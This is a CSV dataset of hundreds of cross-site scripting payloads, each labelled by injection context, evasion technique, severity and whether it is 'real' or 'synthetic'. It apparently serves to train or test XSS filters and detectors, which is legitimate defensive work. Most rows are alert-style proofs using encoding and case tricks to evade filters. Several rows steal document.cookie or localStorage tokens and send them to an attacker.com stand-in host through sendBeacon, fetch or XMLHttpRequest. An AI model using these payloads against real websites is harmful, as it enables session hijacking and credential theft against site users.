payload,context,technique,severity,length,source
"onpoint&#101;rmov&#101;=j&#97;v&#97;script:prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,89,synthetic
"<html onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</html>",tag_injection,none,medium,69,real
onload=javascript:console.log(document.domain),event_handler,synthetic,medium,46,synthetic
onpl&#97;ying=&#97;l&#101;rt(1),event_handler,synthetic,low,31,synthetic
<anImaTetRanSfoRm	OncOntExtMenU=pRomPt(DocUmeNt.DomAin)>,tag_injection,synthetic,medium,56,synthetic
"<base
onpageswap=alert('XSS')>",tag_injection,synthetic,medium,30,synthetic
"""><img src=x ontouchstart=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,63,synthetic
"<s onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</s>",tag_injection,none,medium,64,real
	ondragenter=console.log(document.domain),event_handler,synthetic,medium,41,synthetic
"`><img src=x ongotpointercapture=prompt(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,71,synthetic
\' onscrollsnapchange=alert('XSS')//,attribute_escape,synthetic,medium,36,synthetic
`><img src=x onpopst&#97;t&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,attribute_escape,synthetic,low,71,synthetic
"javascr	ipt:confirm/*x*/(String.fromCharCode(88,83,83))",js_uri,synthetic,high,55,synthetic
onscrollsnapchange=alert/***/(location.hash),event_handler,synthetic,low,44,synthetic
"'""><img/src/onerror=.1|alert``>",tag_injection,none,low,31,real
"\"" on&#101;rror=confirm(loc&#97;tion.h&#97;sh)//",attribute_escape,synthetic,medium,48,synthetic
 onsubmit=alert(location.hash),event_handler,synthetic,medium,30,synthetic
%3Canimatetransform onpointerdown=prompt(1) onpointerdown=prompt(1)%3E,tag_injection,synthetic,medium,70,synthetic
"""><ForM oNweBkiTanImaTioNenD=pRomPt('XSS')>",tag_injection,synthetic,medium,43,synthetic
""" ><svg onwaiting=prompt(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,56,synthetic
"<FRAMESET><FRAME SRC=\""javascript:alert('XSS');\""></FRAMESET>",js_uri,case_variation,medium,61,real
"<style>@keyframes x{}</style><header style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></header>",tag_injection,none,medium,105,real
' ><svG oNbeForEinPut=coNsoLe.Log('XSS')>,attribute_escape,synthetic,medium,41,synthetic
""" ><svG oNmoUseDowN=aLerT(lOcaTioN.hAsh)>",attribute_escape,synthetic,medium,41,synthetic
%27 onwheel=prompt(location.hash) %27,attribute_escape,synthetic,medium,37,synthetic
"<scRipT
>AleRt(StrIng.frOmCHarCodE(88,83,83))</sCriPt>",script_injection,synthetic,high,54,synthetic
\%22 onanimationcancel=confirm(location.hash)//,attribute_escape,synthetic,medium,47,synthetic
"<style>:target {transform: rotate(180deg);}</style><img id=x style=""transition:transform 2s"" ontransitionrun=print()></img>",tag_injection,none,low,123,real
"javascript:\u0061lert(String.fromCharCode(88,83,83))",js_uri,synthetic,high,52,synthetic
<main onpointerdown=alert(1) style=display:block>AnonKryptiQuz</main>,tag_injection,none,medium,69,real
\%22 onerror=alert(1)//,attribute_escape,synthetic,medium,23,synthetic
%3Cbase	ontransitionstart=prompt(location.hash)%3E,tag_injection,synthetic,medium,50,synthetic
<video src=x ondragstart=alert(%27XSS%27)>,tag_injection,synthetic,medium,42,synthetic
"EvaL(""AleRt(NavIgaTor.seNdBEacOn('//AttAckEr.Com',dOcuMenT.cOokIe))"")",dom_sink,synthetic,high,69,synthetic
%0d%0a%20<script>alert(1)</script>,script_injection,url_encoding,medium,34,real
"""><Img srC=x onFocUsiN=pRomPt(1)>",attribute_escape,synthetic,medium,33,synthetic
""" ><svg on&#97;nim&#97;tionit&#101;r&#97;tion=prompt(1)>",attribute_escape,synthetic,medium,56,synthetic
"<style>:target {transform: rotate(180deg);}</style><nextid id=x style=""transition:transform 2s"" ontransitionrun=print()></nextid>",tag_injection,none,low,129,real
%3Cselect	ongotpointercapture=confirm(document.domain)%3E,tag_injection,synthetic,medium,57,synthetic
"\"" OnpOinTerMovE=pRomPt(LocAtiOn.HasH)//",attribute_escape,synthetic,medium,40,synthetic
OnpOinTerUp=ProMpt(doCumEnt.doMaiN),event_handler,synthetic,medium,35,synthetic
	onPoiNteRmoVe=ConSolE.lOg(DocUmeNt.DomAin),event_handler,synthetic,medium,43,synthetic
"<style>:target {color: red;}</style><wbr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></wbr>",tag_injection,none,medium,109,real
"<style id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></style>",tag_injection,none,medium,86,real
' oNhaShcHanGe=ConFirM(dOcuMenT.dOmaIn) ',attribute_escape,synthetic,medium,41,synthetic
"""><mt&#101;xt onfocusout=confirm(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,medium,56,synthetic
%27><script>alert(1)</script>,script_injection,synthetic,medium,29,synthetic
<s&#101;t x=y onc&#97;npl&#97;y=confirm(1)>,tag_injection,synthetic,medium,43,synthetic
#prompt(docum&#101;nt.cooki&#101;),template_injection,synthetic,medium,34,synthetic
<sub onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,53,real
<embed id=x tabindex=1 onbeforeactivate=alert(1)></embed>,tag_injection,none,medium,57,real
"""><base oninput=\u0061lert('XSS')>",tag_injection,synthetic,low,34,synthetic
' onpromptdismiss=prompt(docum&#101;nt.dom&#97;in) ',attribute_escape,synthetic,medium,52,synthetic
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=confirm(loc&#97;tion.h&#97;sh)>"")",dom_sink,synthetic,medium,83,synthetic
<figcaption onpointerleave=alert(1) style=display:block>AnonKryptiQuz</figcaption>,tag_injection,none,medium,82,real
""" %3E%3Csvg ongotpointercapture=alert(document.domain)%3E",attribute_escape,synthetic,medium,57,synthetic
"<style>:target {color:red;}</style><rt id=x style=""transition:color 1s"" ontransitionend=alert(1)></rt>",tag_injection,none,medium,102,real
__proto__[%22ondblclick%22]=confirm(document.cookie+%27&loc=%27+location.href),dom_sink,synthetic,high,78,synthetic
onscrollsn&#97;pch&#97;ng&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh),event_handler,synthetic,low,69,synthetic
"<style>@keyframes slidein {}</style><noframes style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></noframes>",tag_injection,none,medium,170,real
"""%3E%3Cimg src=x oncut=confirm('XSS')%3E",attribute_escape,synthetic,medium,40,synthetic
`><Img srC=x onSecUriTypOliCyvIolAtiOn=ConSolE.lOg('XSS')>,attribute_escape,synthetic,medium,58,synthetic
\' ondrop=prompt('XSS')//,attribute_escape,synthetic,medium,25,synthetic
"\"" OnwAitIng=prOmpT(dOcuMenT.dOmaIn)//",attribute_escape,synthetic,medium,38,synthetic
"""><template onclose=console.log(1)>",tag_injection,synthetic,medium,35,synthetic
"WinDow[""eVal""](DocUmeNt.DomAin)",dom_sink,synthetic,low,31,synthetic
<img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerDocument.cookie) width=0 height= 0 /> #,dom_sink,none,high,115,real
\%22 ongesturestart=alert(location.hash)//,attribute_escape,synthetic,medium,42,synthetic
	onWebKitFulLscReeNchAngE=aLerT(dOcuMenT.dOmaIn),event_handler,synthetic,medium,48,synthetic
<s&#101;t x=y onclos&#101;=confirm(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,61,synthetic
<script>Function('alert(document.domain)')();</script>,script_injection,synthetic,medium,54,synthetic
{{&#97;l&#101;rt(1)}},template_injection,synthetic,low,21,synthetic
<maRquEe/OnsCroLlsNapChaNge=prOmpT(1)>,tag_injection,synthetic,medium,38,synthetic
"<listing
onpopst&#97;t&#101;=prompt(docum&#101;nt.dom&#97;in)>",tag_injection,synthetic,medium,62,synthetic
"<div draggable=""true"" contenteditable>drag me</div><strike ondragover=alert(1) contenteditable>drop here</strike>",tag_injection,none,medium,113,real
<button popovertarget=x>Click me</button><fieldset ontoggle=alert(1) popover id=x>AnonKryptiQuz</fieldset>,tag_injection,none,medium,106,real
"__pRotO__[""oNerRor""]=AleRt('//AttAckEr.Com/?c='+DocUmeNt.CooKie)",dom_sink,synthetic,high,64,synthetic
"<element draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</element>",tag_injection,none,medium,87,real
""" %3E%3Csvg ontouchmove=console.log('XSS')%3E",attribute_escape,synthetic,medium,45,synthetic
__proto__[%22ontouchend%22]=console.log(document.cookie+%27&loc=%27+location.href),dom_sink,synthetic,high,82,synthetic
<%= confirm(%27XSS%27) %>,template_injection,synthetic,medium,25,synthetic
'%3E%3Cimg src=x onmouseover=console.log('XSS')%3E,attribute_escape,synthetic,medium,50,synthetic
{prompt docum&#101;nt.cooki&#101;},template_injection,synthetic,low,34,synthetic
<xml onreadystatechange=alert(1)>,tag_injection,none,medium,33,real
"' onkeydown=prompt(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,high,51,synthetic
\' onhashchange=confirm(document.domain)//,attribute_escape,synthetic,medium,42,synthetic
&quOt; onFocUsiN=pRomPt(1) X=&QuoT;,attribute_escape,synthetic,medium,35,synthetic
"\"" onr&#101;s&#101;t=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape,synthetic,low,79,synthetic
<body oninv&#97;lid=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) oninv&#97;lid=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,110,synthetic
${cOnfIrm('XSS')},template_injection,synthetic,medium,17,synthetic
"<title draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</title>",tag_injection,none,medium,63,real
%3C!--%3E%3Cimage onchange=alert(1)%3E,tag_injection,synthetic,medium,38,synthetic
"&lt;META HTTP-EQUIV=\""Link\"" Content=\""&lt;http&#58;//ha&#46;ckers&#46;org/xss&#46;css&gt;; REL=stylesheet\""&gt;",event_handler,html_entity,low,112,real
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:XMLHttpR&#101;qu&#101;st(bto&#97;(docum&#101;nt.cooki&#101;))""",dom_sink,synthetic,high,105,synthetic
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""&#101;v&#97;l(String.fromCh&#97;rCod&#101;(88,83,83))""",dom_sink,synthetic,low,122,synthetic
"javascript:alert(1)//\"";alert(1);<!--jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//--><FRAME SRC=""javascript:alert(1);""></textarea></style></iframe></noscript></noembed></template></option></select></script><img src=x onerror=alert(1)></title><script>alert(1)</script><img src=0 onerror=alert(1)><img src=x:x onerror=alert(1)> alert(1)//",script_injection,comment_injection|url_encoding|case_variation,medium,361,real
"<address id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></address>",tag_injection,none,medium,90,real
"<image draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</image>",tag_injection,none,medium,88,real
' ><svg ongesturestart=prompt('XSS')>,attribute_escape,synthetic,medium,37,synthetic
OnhAshChaNge=alErt/**/(lOcaTioN.hAsh),event_handler,synthetic,low,37,synthetic
<maRquEe/OnaUxcLicK=cOnfIrm(loCatIon.haSh)>,tag_injection,synthetic,medium,43,synthetic
<td src=x onend=console.log(document.domain)>,tag_injection,synthetic,medium,45,synthetic
&quot; onmouseenter=alert(document.domain) x=&quot;,attribute_escape,synthetic,medium,51,synthetic
"<noframes onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</noframes>",tag_injection,none,medium,74,real
perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(&quot;XSS&quot;)>&quot;;&apos;&gt; out,generic,none,medium,95,real
<title/onstalled=\u0061lert('XSS')>,tag_injection,synthetic,low,35,synthetic
<s&#101;t onclos&#101;=confirm(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,57,synthetic
'><Img srC=x onPagEshOw=ConSolE.lOg('XSS')>,attribute_escape,synthetic,medium,43,synthetic
"element.setAttribute(%22onclick%22,%22alert(navigator.sendBeacon(%27//attacker.com%27,document.cookie))%22)",dom_sink,synthetic,high,107,synthetic
<animatemotion src=x onanimationcancel=prompt(1)>,tag_injection,synthetic,medium,49,synthetic
&quOt; onKeyPreSs=AleRt('XSS') x=&quOt;,attribute_escape,synthetic,medium,39,synthetic
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=XMLHttpRequest(btoa(document.cookie))>%22)",dom_sink,synthetic,high,107,synthetic
<base onkeydown=alert('XSS')>,tag_injection,synthetic,medium,29,synthetic
"\' OncAnpLay=coNfiRm(StrIng.frOmCHarCodE(88,83,83))//",attribute_escape,synthetic,high,53,synthetic
onpointerrawupdate=javascript:console.log(1),event_handler,synthetic,medium,44,synthetic
<SCRIPT>alert(%27XSS%27)</SCRIPT>,script_injection,synthetic,medium,33,synthetic
' ><svG oNtoUchStaRt=ConSolE.lOg(DocUmeNt.DomAin)>,attribute_escape,synthetic,medium,50,synthetic
&quOt; onEndEd=AleRt('XSS') x=&quOt;,attribute_escape,synthetic,medium,36,synthetic
'><img src=x onbeforematch=\u0061lert('XSS')>,attribute_escape,synthetic,low,45,synthetic
"<tfoot onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</tfoot>",tag_injection,none,medium,68,real
"`><Img srC=x onFocUs=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape,synthetic,high,64,synthetic
"<source onmouseover=""alert(1)"">AnonKryptiQuz</source>",tag_injection,none,medium,53,real
'><img src=x onp&#97;g&#101;hid&#101;=prompt(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,medium,71,synthetic
"<foRm	OnwEbkItfUllScrEenChaNge=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection,synthetic,high,74,synthetic
<di&#97;log x=y onst&#97;ll&#101;d=confirm('XSS')>,tag_injection,synthetic,medium,50,synthetic
' ><svg on&#101;nd&#101;d=&#97;l&#101;rt(1)>,attribute_escape,synthetic,low,44,synthetic
"\"" OncLosE=aLerT(dOcuMenT.dOmaIn)//",attribute_escape,synthetic,medium,35,synthetic
"document.body.innerHTML=""<img src=x onerror=XMLHttpRequest(document.cookie+'&loc='+location.href)>""",dom_sink,synthetic,high,99,synthetic
"onbegin=confirm(String.fromCharCode(88,83,83))",event_handler,synthetic,high,46,synthetic
"<nobr draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</nobr>",tag_injection,none,medium,84,real
{{$on.constructor('confirm('XSS')')()}},template_injection,synthetic,medium,39,synthetic
'><img src=x ontr&#97;nsition&#101;nd=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,low,79,synthetic
&quOt; onPagEswAp=AleRt(DocUmeNt.DomAin) x=&qUot;,attribute_escape,synthetic,medium,49,synthetic
"'><img src=x onpoint&#101;rup=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,78,synthetic
"<element onmousemove=""alert(1)"">AnonKryptiQuz</element>",tag_injection,none,medium,55,real
'><img src=x ontouchmov&#101;=confirm('XSS')>,attribute_escape,synthetic,medium,45,synthetic
"<image3 draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</image3>",tag_injection,none,medium,89,real
<noscript onp&#97;st&#101;=confirm(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,58,synthetic
"<mark onmouseenter=""alert(1)"">AnonKryptiQuz</mark>",tag_injection,none,medium,50,real
""" ><svg onpromptdismiss=alert('XSS')>",attribute_escape,synthetic,medium,37,synthetic
"<dl onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</dl>",tag_injection,none,medium,57,real
"data:text/html,<scr	ipt>console.log(document.domain)</scr	ipt>",js_uri,synthetic,medium,62,synthetic
<dialog src=x onended=console.log(1)>,tag_injection,synthetic,medium,37,synthetic
"onerror CDATA ""alert(67)""",generic,none,medium,25,real
{{confirm(document.cookie)}},template_injection,synthetic,high,28,synthetic
"document.querySelector(""body"").innerHTML+=""console.log(1)""",dom_sink,synthetic,high,58,synthetic
"\""-alert(1)}//",generic,none,medium,14,real
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=console.log(localStorage.getItem('token'))>"")",dom_sink,synthetic,high,104,synthetic
"%3Canimatemotion
onanimationiteration=console.log('XSS')%3E",tag_injection,synthetic,medium,59,synthetic
"<section onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</section>",tag_injection,none,medium,76,real
<tr onselect=console.log(1)/>,tag_injection,synthetic,medium,29,synthetic
""" ><svG oNfoCus=prOmpT(lOcaTioN.hAsh)>",attribute_escape,synthetic,medium,38,synthetic
"<ins onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></ins>",tag_injection,none,medium,279,real
\' onwh&#101;&#101;l=prompt('XSS')//,attribute_escape,synthetic,medium,36,synthetic
"<span onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</span>",tag_injection,none,medium,83,real
' %3E%3Csvg onmousewheel=alert(location.hash)%3E,attribute_escape,synthetic,medium,48,synthetic
__proto__[%22onanimationstart%22]=alert(%27//attacker.com/?c=%27+document.cookie),dom_sink,synthetic,high,81,synthetic
<script>Function('&#97;l&#101;rt(docum&#101;nt.dom&#97;in)')();</script>,script_injection,synthetic,low,72,synthetic
<form ong&#101;stur&#101;st&#97;rt=consol&#101;.log('XSS')>,tag_injection,synthetic,low,59,synthetic
j&#97;v&#97;	script:consol&#101;.log(docum&#101;nt.dom&#97;in),js_uri,synthetic,low,62,synthetic
""" onpl&#97;y=confirm('XSS') """,attribute_escape,synthetic,medium,29,synthetic
"<time onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</time>",tag_injection,none,medium,64,real
"<slot draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</slot>",tag_injection,none,medium,84,real
'><img src=x ontouchmov&#101;=consol&#101;.log('XSS')>,attribute_escape,synthetic,low,54,synthetic
oninvalid=javascript:confirm(1),event_handler,synthetic,medium,31,synthetic
"WinDow[""pRomPt""](dOcuMenT.dOmaIn)",dom_sink,synthetic,low,33,synthetic
"__pRotO__[""oNkeYprEss""]=ConSolE.lOg(DocUmeNt.CooKie)",dom_sink,synthetic,high,52,synthetic
"<colgroup onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</colgroup>",tag_injection,none,medium,77,real
<svg><acronym onload=alert(1)></acronym>,tag_injection,none,medium,40,real
"' %3E%3Csvg onplaying=alert(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,61,synthetic
"<em oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,96,real
onfocusin=confirm/***/(%27XSS%27),event_handler,synthetic,low,33,synthetic
<anImaTemOtiOn/OngEstUreStaRt=ConFirM(1)>,tag_injection,synthetic,medium,41,synthetic
<a onsearch=\u0061lert(1)>,tag_injection,synthetic,low,26,synthetic
<title onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
"""%3E%3Cplaintext onpagereveal=alert(location.hash)%3E",tag_injection,synthetic,medium,53,synthetic
%27><img src=x ondragstart=console.log(location.hash)>,attribute_escape,synthetic,medium,54,synthetic
"<acronym draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</acronym>",tag_injection,none,medium,70,real
"location.href=""javascript:XMLHttpRequest(String.fromCharCode(88,83,83))""",dom_sink,synthetic,high,72,synthetic
""" onmous&#101;ov&#101;r=prompt(loc&#97;tion.h&#97;sh) x=""",attribute_escape,synthetic,medium,57,synthetic
"&lt;BR SIZE=\""&{alert('XSS')}\""&gt;",generic,none,medium,35,real
<base/oninput=alert('XSS')>,tag_injection,synthetic,medium,27,synthetic
{{\u0061lert|constructor:'XSS'}},template_injection,synthetic,low,32,synthetic
"document.write(""<img src=x onerror=fetch(localStorage.getItem('token'))>"")",dom_sink,synthetic,high,74,synthetic
%27><img src=x onanimationiteration=console.log(%27XSS%27)>,attribute_escape,synthetic,medium,59,synthetic
"<div draggable=""true"" contenteditable>drag me</div><command ondrop=alert(1) contenteditable>drop here</command>",tag_injection,none,medium,111,real
"<div draggable=""true"" contenteditable>drag me</div><code ondragover=alert(1) contenteditable style=display:block>drop here</code>",tag_injection,none,medium,129,real
"<style>@keyframes x{}</style><rb style=""animation-name:x"" onanimationstart=""alert(1)""></rb>",tag_injection,none,medium,91,real
"`%3E%3Cimg src=x onpointermove=alert(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,70,synthetic
JAVASCRIPT:pRomPt('XSS'),js_uri,synthetic,medium,24,synthetic
"<img src=x onerror=\x11""javascript:alert(1156)"">",js_uri,none,medium,48,real
"__proto__[""on&#97;nim&#97;tionc&#97;nc&#101;l""]=f&#101;tch(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))",dom_sink,synthetic,low,159,synthetic
%3Ctable/oncopy=confirm('XSS')%3E,tag_injection,synthetic,medium,33,synthetic
"<content oncontextmenu=""alert(1)"">AnonKryptiQuz</content>",tag_injection,none,medium,57,real
' ><svG oNwhEel=alErt('XSS')>,attribute_escape,synthetic,medium,29,synthetic
onanimationend=javascript:alert(1),event_handler,synthetic,medium,34,synthetic
<td onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</td><input value=clickme>,tag_injection,none,medium,104,real
"<element draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</element>",tag_injection,none,medium,67,real
{confirm document.cookie},template_injection,synthetic,high,25,synthetic
"<?xml-stylesheet type=""text/xsl"" href=""data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='AnonKryptiQuz'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E""?>",generic,url_encoding,medium,281,real
"OnbEfoRepAstE=aLerT(STriNg.FroMChArCOde(88,83,83))",event_handler,synthetic,high,50,synthetic
<del onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</del><input value=clickme>,tag_injection,none,medium,106,real
"<script onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</script>",script_injection,none,medium,87,real
""" onh&#97;shch&#97;ng&#101;=confirm(docum&#101;nt.dom&#97;in) """,attribute_escape,synthetic,medium,63,synthetic
"<figure onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</figure>",tag_injection,none,medium,73,real
<!--><form onwebkitanimationend=prompt('XSS')>,tag_injection,synthetic,medium,46,synthetic
<!--><m&#97;rqu&#101;&#101; on&#97;uxclick=prompt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,73,synthetic
%22 onend=confirm(%27XSS%27) %22,attribute_escape,synthetic,medium,32,synthetic
"<label draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</label>",tag_injection,none,medium,66,real
"<foRm Src=x OnwEbkItfUllScrEenChaNge=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection,synthetic,high,80,synthetic
"<style>:target {transform: rotate(180deg);}</style><b id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></b>",tag_injection,none,medium,120,real
<body	onclose=console.log('XSS')>,tag_injection,synthetic,medium,33,synthetic
""" %3E%3Csvg onerror=console.log(location.hash)%3E",attribute_escape,synthetic,medium,49,synthetic
<data onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</data><input value=clickme>,tag_injection,none,medium,99,real
<t&#101;mpl&#97;t&#101; onr&#101;s&#101;t=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) onr&#101;s&#101;t=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,136,synthetic
"<style>@keyframes x{}</style><meter style=""animation-name:x"" onanimationend=""alert(1)""></meter>",tag_injection,none,medium,95,real
%27 ><svg oncut=console.log(1)>,attribute_escape,synthetic,medium,31,synthetic
	onwebkitanimationend=\u0061lert(1),event_handler,synthetic,low,35,synthetic
 onLoaD=aLerT(dOcuMenT.dOmaIn),event_handler,synthetic,medium,30,synthetic
"onwebkitanimationend=prompt&#40;String.fromCharCode(88,83,83)&#41;",event_handler,synthetic,high,66,synthetic
"&quot; onanimationstart=alert(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape,synthetic,high,69,synthetic
"""><im&#97;g&#101; on&#101;nd=prompt(1)>",tag_injection,synthetic,medium,39,synthetic
"<rtc onmouseenter=""alert(1)"">AnonKryptiQuz</rtc>",tag_injection,none,medium,48,real
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""consol&#101;.log(bto&#97;(docum&#101;nt.cooki&#101;))"")",dom_sink,synthetic,low,112,synthetic
<IMG SRC=”javascript:alert(‘XSS’);”>,js_uri,case_variation,medium,36,real
<di&#97;log onp&#97;g&#101;hid&#101;=consol&#101;.log(1) onp&#97;g&#101;hid&#101;=consol&#101;.log(1)>,tag_injection,synthetic,low,102,synthetic
document.querySelector(%22body%22).innerHTML+=%22confirm(document.cookie)%22,dom_sink,synthetic,high,76,synthetic
<audio onpause=console.log(document.domain) onpause=console.log(document.domain)>,tag_injection,synthetic,medium,81,synthetic
"<div draggable=""true"" contenteditable>drag me</div><details ondragover=alert(1) contenteditable>drop here</details>",tag_injection,none,medium,115,real
<br onpointerup=alert(1) style=display:block>AnonKryptiQuz</br>,tag_injection,none,medium,63,real
`><img src=x onsecuritypolicyviolation=prompt(1)>,attribute_escape,synthetic,medium,49,synthetic
<em id=x tabindex=1 onfocusin=alert(1)></em>,tag_injection,none,medium,44,real
' %3E%3Csvg onwaiting=prompt(document.domain)%3E,attribute_escape,synthetic,medium,48,synthetic
<area onclose=prompt(1) onclose=prompt(1)>,tag_injection,synthetic,medium,42,synthetic
<buTtoN x=y OndRagEntEr=AleRt(LocAtiOn.HasH)>,tag_injection,synthetic,medium,45,synthetic
&quot; onhashchange=prompt('XSS') x=&quot;,attribute_escape,synthetic,medium,42,synthetic
"""><Img srC=x onPlaYinG=aLerT(STriNg.FroMChArCOde(88,83,83))>",attribute_escape,synthetic,high,60,synthetic
`%3E%3Cimg src=x onwebkitfullscreenchange=prompt('XSS')%3E,attribute_escape,synthetic,medium,58,synthetic
"<menu onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</menu>",tag_injection,none,medium,69,real
"<td
onmozfullscreenchange=console.log(location.hash)>",tag_injection,synthetic,medium,53,synthetic
' oNcuT=aLerT('XSS') ',attribute_escape,synthetic,medium,22,synthetic
"<canvas draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</canvas>",tag_injection,none,medium,68,real
"' oNchAngE=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83)) '",attribute_escape,synthetic,high,51,synthetic
<p onfocus=alert(1) autofocus tabindex=1>,tag_injection,none,medium,41,real
"\"" on&#97;nim&#97;tionc&#97;nc&#101;l=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))//",attribute_escape,synthetic,low,94,synthetic
"${{'alert(document.domain)'.replace('alert(document.domain)','')}}",template_injection,synthetic,medium,66,synthetic
&quot; onpopst&#97;t&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) x=&quot;,attribute_escape,synthetic,low,73,synthetic
